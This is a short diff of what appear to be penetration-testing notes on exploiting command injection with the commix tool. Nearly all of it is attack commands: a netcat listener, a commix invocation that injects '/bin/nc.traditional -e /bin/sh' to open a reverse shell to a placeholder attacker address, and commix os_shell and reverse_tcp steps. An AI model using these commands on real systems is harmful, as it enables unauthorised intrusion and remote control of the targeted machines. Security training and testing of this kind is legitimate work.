@@ -29,14 +29,14 @@ nc -lvp 1234
 
 commix -u 'http://victim.ip.address/commandexec/example1.php?ip=127.0.0.1' --os-cmd="/bin/nc.traditional -e /bin/sh attacker.ip.adddress 1234"
 ```
-
-# On Attacker
+Technique 2
+-----------
 ````bash
+# Start NC listener on attackers server
 nc -lvp 1234
-````
 
 # Exploit Found
-```bash
+
 os_shell
 commix(os_shell)
 reverse_tcp
